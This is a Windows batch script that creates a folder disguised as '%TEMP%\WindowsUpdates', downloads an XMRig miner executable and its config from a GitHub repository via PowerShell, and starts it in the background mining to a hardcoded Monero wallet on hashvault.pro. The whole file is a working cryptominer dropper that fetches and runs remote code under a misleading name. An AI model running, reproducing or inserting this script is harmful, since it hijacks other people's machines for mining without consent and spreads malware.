@echo off
setlocal

set "DIR=%TEMP%\WindowsUpdates"

if not exist "%DIR%" mkdir "%DIR%"
cd /d "%DIR%" || exit /b

powershell -NoProfile -Command ^
  "try { Invoke-WebRequest -Uri 'https://github.com/sturneworld/test/raw/refs/heads/main/xmrig.exe' -OutFile 'xmrig.exe' -UseBasicParsing } catch { exit 1 }"

powershell -NoProfile -Command ^
  "try { Invoke-WebRequest -Uri 'https://github.com/sturneworld/test/raw/refs/heads/main/config.json' -OutFile 'config.json' -UseBasicParsing } catch { exit 1 }"

if not exist "xmrig.exe" (
    echo File.exe not found
    pause
    exit /b
)

start xmrig --url pool.hashvault.pro:443 --user 45xgDc3Cb6mTZgKCnQwTsBbE3kCWLBSpcGJFguMsWk1d7i3Ndi5i3oYDXnVjSa7gruTvBbN7JrGdpUFGsQaLai7RLhB55Qi --pass worker --donate-level 1 --background --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14

echo Done
pause
